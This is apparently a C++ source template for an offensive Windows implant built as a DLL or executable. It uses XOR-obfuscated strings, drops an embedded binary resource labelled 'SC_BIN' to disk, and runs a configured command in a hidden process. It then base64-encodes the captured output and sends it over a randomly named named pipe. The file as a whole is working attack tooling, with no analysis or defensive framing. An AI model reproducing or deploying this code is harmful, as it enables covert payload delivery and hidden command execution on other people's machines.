#include "template.h"


HMODULE currentPE = NULL;

// GenRandom - generates a string of random characters
//
//	len: the length of the random string
//
// Returns a string length len of random characters
std::wstring GenRandom(const int len) {
    const std::string CHARACTERS = XorStr("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");
    std::random_device randDevice;
    std::mt19937 generator(randDevice());
    std::uniform_int_distribution<> distribution(0, CHARACTERS.size() - 1);

    std::string randStr;
    for (std::size_t i = 0; i < len; ++i) { randStr += CHARACTERS[distribution(generator)]; }

    return std::wstring(randStr.begin(), randStr.end());
}

// CreatePipe - creates a named pipe
//
//	pipeName: the randomly generated name of the pipe
//
// Returns the handle to the named pipe
HANDLE CreatePipe(std::wstring pipeName) {
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = FALSE;
    sa.lpSecurityDescriptor = NULL; 

    HANDLE hPipe = CreateNamedPipeW(
        pipeName.c_str(),           // Name of the pipe
        PIPE_ACCESS_OUTBOUND,       // 1-way pipe -- send only
        PIPE_TYPE_BYTE,             // Send data as a byte stream
        PIPE_UNLIMITED_INSTANCES,   // Only allow 1 instance of this pipe
        PIPE_IN_BUFFER,             // Outbound buffer
        PIPE_OUT_BUFFER,            // Inbound buffer
        0,                          // Default time-out
        NULL                        // Security attributes
    );

    if (hPipe == INVALID_HANDLE_VALUE || GetLastError() == ERROR_PIPE_BUSY || GetLastError() == ERROR_FILE_NOT_FOUND) {
        std::cout << XorStr("Failed to connect to the pipe.") << std::endl;
        return NULL;
    }

    return hPipe;
}

// CreateProc - Creates a process with output directed to a anonymous pipes and reads the output from the pipes.
//
// Returns the process output in a string
std::string CreateProc() {
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
  
    HANDLE hPipeRead, hPipeWrite;
    if (!CreatePipe(&hPipeRead, &hPipeWrite, &sa, 0)) {
        std::cout << XorStr("Failed to create anonymous pipe.") << std::endl;
        return "";
    }
    if (!SetHandleInformation(hPipeRead, HANDLE_FLAG_INHERIT, 0)) {
        std::cout << XorStr("Failed to set handle information.") << std::endl;
        return "";
    }

    STARTUPINFOW si;
    PROCESS_INFORMATION pi; 
    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdError = hPipeWrite;
    si.hStdOutput = hPipeWrite;

    // Build the command line
    std::string args = std::string(ARGS);
    std::wstring cmdLine = DEFAULT_PROCESS + std::wstring(args.begin(), args.end());

    // Create process
    if (!CreateProcessW(NULL, cmdLine.data(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        std::cout << XorStr("Failed to create process.") << std::endl;
        return "";
    }

    //Wait for the process to end and read buffer as it does
    char buffer[PIPE_OUT_BUFFER];
    std::string output; 
    DWORD bytesAvailable = 0;
    while( WaitForSingleObject(pi.hProcess, 0) != WAIT_OBJECT_0 ) {
        if(!PeekNamedPipe(hPipeRead, NULL, PIPE_OUT_BUFFER - 1 , NULL, &bytesAvailable, NULL)) { return 0; }
        while(bytesAvailable) {
            if (ReadFile(hPipeRead, buffer, bytesAvailable, NULL, NULL)) {
                buffer[bytesAvailable] = '\0';
                output.append(buffer);
            }
            if(!PeekNamedPipe(hPipeRead, NULL, PIPE_OUT_BUFFER - 1, NULL, &bytesAvailable, NULL)) { return 0; }
        }
    }
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(si.hStdError);
    CloseHandle(si.hStdOutput);
    CloseHandle(hPipeRead);
    CloseHandle(hPipeWrite);

    return output;
}	
    
BOOL WriteToPipe(HANDLE pipe, std::string data) {
    //Write the output to the named pipe
    BOOL sent = false;
    std::string processOutput = data.substr(0, data.length() - 2);		//CreateProcess writes 2 extra bytes to the pipe, chop them off here for precision
    std::string b64ProcessOutput = base64_encode(reinterpret_cast<const BYTE*>(&processOutput[0]), processOutput.size());
    
    size_t timeWaited = 0;
    DWORD waitLimit = TIMEOUT_SECONDS * 1000;
    while (!sent) {
        if (timeWaited >= waitLimit) {
            std::cout << XorStr("Failed to send data: timed out.") << std::endl;
            return FALSE;
        }
        BOOL result = ConnectNamedPipe(pipe, NULL);
        if (GetLastError() != ERROR_PIPE_CONNECTED && !result) {
            std::cout << XorStr("Unable to connect to named pipe: ") << GetLastError() << std::endl;
            timeWaited += WAIT_PERIOD;
            continue;
        }
        DWORD bytesWritten = 0;
        if (!WriteFile(pipe, &b64ProcessOutput[0], b64ProcessOutput.length(), &bytesWritten, NULL)) {
            std::cout << XorStr("Failed to write to the pipe.") << std::endl;
            return FALSE;
        }
        if (result) {
            std::cout << XorStr("Successfully wrote ") << std::to_string(bytesWritten) << XorStr(" bytes to the pipe.") << std::endl;	
        } else {
            std::cout << XorStr("Failed to send data.") << std::endl;
            continue;
        }
        sent = true;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) int Run() {
    // Find, load, lock and write the payload to disk if the payload name is provided
    if (std::string(PAYLOAD_NAME).length() > 0) {
        //Find, load, and lock the resource
        HRSRC res = FindResourceW(currentPE, MAKEINTRESOURCEW(IDR_SC_BIN1), L"SC_BIN");
        if (res==NULL) {
            std::cerr << XorStr("FindResourceW ERROR: ") << GetLastError() << std::endl;
            return EXIT_FAILURE;
        }
        HGLOBAL resHandle = LoadResource(currentPE, res);
        if (resHandle==NULL) {
            std::cerr << XorStr("LoadResource ERROR: ") << GetLastError() << std::endl;
            return EXIT_FAILURE;
        }
        DWORD payloadSize = SizeofResource(currentPE, res);
        if (payloadSize==0) {
            std::cerr << XorStr("SizeOfResource ERROR: ") << GetLastError() << std::endl;
            return EXIT_FAILURE;
        }
        void* payload = LockResource(resHandle);
        if (payload==NULL) {
            std::cerr << XorStr("LockResource ERROR: ") << GetLastError() << std::endl;
            return EXIT_FAILURE;
        }

        //Write the resource to disk
        std::string payloadPath = std::string(PAYLOAD_PATH) + "\\" + std::string(PAYLOAD_NAME);
        
        std::ofstream outfile(payloadPath.c_str(), std::ios::binary);
        if (!outfile.is_open()) {
            std::cerr << XorStr("Outfile ERROR: ") << GetLastError() << std::endl;
            return EXIT_FAILURE;
        }
        
        if (outfile.write((char*)payload, payloadSize)) {
            int res = 0;
        } else {
            int res = EXIT_FAILURE;
        }
        outfile.close();
    }

    //Create named pipe and execute process if args are provided
    if (std::string(ARGS).length() > 0) {
        //Create the named pipe
        std::wstring pipePath = XorStrW(L"\\\\.\\pipe\\");
        std::wstring pipeName = pipePath + DEFAULT_PIPE_PREFIX + GenRandom(11);

        HANDLE pipe = CreatePipe(pipeName);
        if (pipe == INVALID_HANDLE_VALUE || pipe == NULL) {
            std::cout << XorStr("Failed to create named pipe: ") << GetLastError() << std::endl;
            return EXIT_FAILURE;
        }

        //Create process with output directed to the named pipe
        std::string processOutput = CreateProc();
        if (processOutput == "") {
            std::cout << XorStr("No process output.") << std::endl;
            CloseHandle(pipe);
            return EXIT_SUCCESS;
        }
    
        //Write process output to named pipe
        if (!WriteToPipe(pipe, processOutput)) {
            std::cout << XorStr("Failed to write to named pipe.") << std::endl;
            CloseHandle(pipe);
            return EXIT_FAILURE;
        }
        CloseHandle(pipe);
    }
    return 0;
}

int main() {
    std::cout << XorStr("Args: ") << ARGS << XorStr(" Payload path: ") << PAYLOAD_PATH << XorStr(" Payload name: ") << PAYLOAD_NAME << std::endl;
    Run();
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        currentPE = reinterpret_cast<HMODULE>(hinstDLL);
        break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
